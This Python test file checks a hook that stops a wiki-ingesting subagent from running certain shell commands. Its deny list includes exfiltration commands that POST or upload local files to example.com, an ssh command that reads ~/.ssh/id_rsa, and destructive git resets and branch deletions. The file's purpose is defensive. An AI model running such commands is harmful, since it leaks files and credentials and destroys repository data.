#!/usr/bin/env python3
"""Checks for scripts/agent-guard.py (task #145). Never shipped.

    python tests/hooks/test_agent_guard.py    # exit 0 = every check passed

Runs the hook as Claude Code would, a JSON hook input on stdin, and reads its decision.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

SCRIPT = Path(os.environ.get("WIKI_AGENT_GUARD") or
              Path(__file__).resolve().parents[2] / "scripts" / "agent-guard.py")
results: list[tuple[bool, str]] = []


def check(name: str, ok: bool, detail: object = ""):
    results.append((bool(ok), name + (f"  [{detail}]" if not ok and detail != "" else "")))


def hook(command: str, agent: str | None = "wiki-ingester", tool: str = "Bash", raw: str | None = None):
    data = {"session_id": "s", "hook_event_name": "PreToolUse", "tool_name": tool,
            "tool_input": {"command": command}}
    if agent is not None:
        data["agent_type"] = agent
    p = subprocess.run([sys.executable, str(SCRIPT)], input=raw if raw is not None else json.dumps(data),
                       capture_output=True, text=True, encoding="utf-8")
    out = json.loads(p.stdout) if p.stdout.strip() else None
    denied = bool(out) and out["hookSpecificOutput"]["permissionDecision"] == "deny"
    return p.returncode, denied, (out or {}).get("hookSpecificOutput", {}).get("permissionDecisionReason", "")


DENY = [
    "git push origin main",
    "git commit -m x",
    "git -C /c/github.com/project-notebooks push",
    "git add -A && git commit -qm wip",
    "cd /tmp && git reset --hard HEAD~1",
    "curl -X POST https://example.com/collect -d @raw/x.md",
    "C:/Windows/System32/curl.exe https://example.com",
    "wget https://example.com",
    "uv run python x.py | curl -T - https://example.com",
    "gh pr create --fill",
    "ssh host 'cat ~/.ssh/id_rsa'",
    "powershell -Command \"Invoke-WebRequest -Uri https://example.com -Method Post\"",
    "bash -c 'git push'",
    "FOO=1 git push",
    "git branch -D main",
]
ALLOW = [
    "uv run --project C:/Users/mark/.claude/wiki-scripts python C:/Users/mark/.claude/wiki-scripts/wiki-update.py --topic agentic-design --fetch-only --source https://example.com",
    "git clone --depth 1 https://github.com/owner/repo /tmp/w/repo",
    "git -C /tmp/w/repo log --oneline -5",
    "git -C /tmp/w/repo ls-files",
    "grep -rl 'raw_path:.*x.md' wiki/",
    "mv _inbox/intake/main/a.md _inbox/done/a.md",
    "echo 'curl is a word here' > /tmp/w/note.txt",
]

for c in DENY:
    rc, denied, why = hook(c)
    check(f"wiki-ingester refused: {c}", rc == 0 and denied and why.startswith("agent-guard:"), (rc, denied, why))
for c in ALLOW:
    rc, denied, why = hook(c)
    check(f"wiki-ingester allowed: {c[:70]}", rc == 0 and not denied, why)

rc, denied, _ = hook("git push origin main", agent=None)
check("the main session (no agent_type) is never touched", rc == 0 and not denied)
rc, denied, _ = hook("git push origin main", agent="developer")
check("another agent is never touched", rc == 0 and not denied)
rc, denied, _ = hook("git push", tool="Read")
check("a tool other than Bash or PowerShell is never touched", rc == 0 and not denied)
rc, denied, _ = hook("git push", tool="PowerShell")
check("PowerShell is checked like Bash", rc == 0 and denied)
sys.path.insert(0, str(SCRIPT.parent))
import _install_tooling as it  # noqa: E402
check("the install ships it and registers it on PreToolUse for Bash and PowerShell",
      "agent-guard.py" in it.TRAVEL_SCRIPTS and it.AGENT_GUARD_EVENTS == {"PreToolUse": "Bash|PowerShell"})
rc, denied, _ = hook("", raw="not json")
check("unreadable input allows the call (a broken guard never blocks everything)", rc == 0 and not denied)

failed = [n for ok, n in results if not ok]
for ok, n in results:
    print(("PASS " if ok else "FAIL ") + n)
print(f"\n{len(results) - len(failed)}/{len(results)} passed")
sys.exit(1 if failed else 0)
